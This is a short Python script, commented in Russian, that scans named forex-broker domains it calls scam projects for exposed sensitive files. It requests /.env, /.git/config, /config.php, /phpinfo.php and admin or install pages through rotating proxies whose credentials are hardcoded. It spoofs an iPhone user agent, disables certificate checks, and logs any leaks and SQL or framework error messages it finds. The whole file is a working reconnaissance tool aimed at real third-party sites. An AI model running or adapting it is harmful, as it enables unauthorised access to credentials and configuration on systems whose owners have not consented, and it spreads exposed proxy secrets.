#!/usr/bin/env python3
"""Паук скам-проекта: ротация 2 прокси (161 браузерный + 193 serper), iPhone-UA.
Ошибка=дыра=открыто. Качает открытое."""
import sys, json, re, random, requests, urllib3
urllib3.disable_warnings()

PROXIES = [
    {"http": "http://nt32pe:yzuAZr@161.0.21.149:8000", "https": "http://nt32pe:yzuAZr@161.0.21.149:8000"},
    {"http": "http://4vZ956:E4RnNa@193.41.115.31:8000", "https": "http://4vZ956:E4RnNa@193.41.115.31:8000"},
]
UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
SIGNALS = ["sql syntax","fatal error","stack trace","uncaught","warning:","exception","syntax error","mysql","laravel","PDOException","SQLSTATE"]
HOLES = ["/.env","/core/.env","/admin","/install","/config.php","/.git/config","/phpinfo.php"]

def scan(dom):
    base = f"https://{dom}"
    proxy = random.choice(PROXIES)
    found = {"dom": dom, "errors": [], "open": []}
    try:
        r = requests.get(base+"/", proxies=proxy, headers={"User-Agent":UA}, verify=False, timeout=12)
        ml = len(r.text)
        for sig in SIGNALS:
            if sig in r.text.lower():
                found["errors"].append(sig)
        for p in HOLES:
            try:
                r2 = requests.get(base+p, proxies=proxy, headers={"User-Agent":UA}, verify=False, timeout=8)
                b2 = r2.text
                is_leak = '=' in b2[:200] and 'html' not in b2[:100].lower() and '<' not in b2[:50]
                if r2.status_code == 200 and (is_leak or (abs(len(b2)-ml) > 50 and len(b2) < 50000)):
                    found["open"].append({"path": p, "len": len(b2), "leak": is_leak})
            except Exception:
                pass
    except Exception as e:
        found["error"] = str(e)[:50]
    return found

if __name__ == "__main__":
    targets = sys.argv[1].split(",") if len(sys.argv) > 1 else ["quomarkets.com","zforex.com","yadix.com","zeromarkets.com"]
    results = []
    for dom in targets:
        res = scan(dom)
        status = "🔴 ДЫРЫ" if (res["errors"] or res["open"]) else "чисто"
        print(f"{status} {dom}: ошибки={res['errors']} открыто={len(res['open'])}", flush=True)
        for o in res["open"][:4]:
            print(f"    ✅ {o['path']} ({o['len']}б){' УТЕЧКА' if o['leak'] else ''}", flush=True)
        results.append(res)
    json.dump(results, open('/root/office/output/scam_holes.json','w'), indent=1)
